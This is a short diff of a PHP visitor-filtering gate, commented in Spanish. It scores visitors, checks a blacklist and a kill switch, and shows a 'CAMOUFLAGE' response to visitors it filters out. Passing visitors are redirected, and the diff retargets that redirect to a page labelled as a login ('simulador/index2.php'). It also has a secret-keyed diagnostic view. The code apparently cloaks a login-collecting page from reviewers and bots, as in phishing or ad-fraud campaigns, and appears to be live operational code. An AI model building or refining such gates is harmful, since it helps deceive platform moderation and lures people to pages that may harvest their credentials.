@@ -26,7 +26,7 @@ if (isset($_GET['diag']) && hash_equals('mi_diag_2026_x9k2', (string)$_GET['diag
     echo "Has cookie:   " . ($has_cookie ? 'SI' : 'NO') . "\n";
     echo "Blacklisted:  " . ($blacklisted ? 'SI' : 'NO') . "\n";
     echo "Kill switch:  " . ($kill_active ? 'SI' : 'NO') . "\n";
-    echo "Resultado:    " . (($dscore < 10 && !$kill_active && !$blacklisted) ? 'PASA al simulador' : 'CAMOUFLAGE') . "\n";
+    echo "Resultado:    " . (($dscore < 10 && !$kill_active && !$blacklisted) ? 'PASA a simulador/index2.php (login)' : 'CAMOUFLAGE') . "\n";
     echo "\nUA:           " . ($_SERVER['HTTP_USER_AGENT'] ?? '') . "\n";
     echo "Accept-Lang:  " . ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '') . "\n";
     echo "Referer:      " . ($_SERVER['HTTP_REFERER'] ?? '(ninguno)') . "\n";
@@ -37,7 +37,7 @@ if (isset($_GET['diag']) && hash_equals('mi_diag_2026_x9k2', (string)$_GET['diag
 // Esto cubre el caso del visitante legítimo que vuelve por segunda vez
 // (cookie de 2h vive más que la cookie de sesión de FB).
 if ($has_cookie && !$kill_active && !$blacklisted) {
-    header('Location: /simulador/', true, 302);
+    header('Location: /simulador/index2.php', true, 302);
     exit;
 }
 
@@ -64,7 +64,7 @@ if ($kill_active || $blacklisted) {
 if ($score < 10 && !$kill_active && !$blacklisted) {
     $_SESSION['gate_pass'] = time();
     gate_set_cookie(7200); // 2h: cubre lectura lenta + multipasos del flujo
-    header('Location: /simulador/', true, 302);
+    header('Location: /simulador/index2.php', true, 302);
     exit;
 }
 
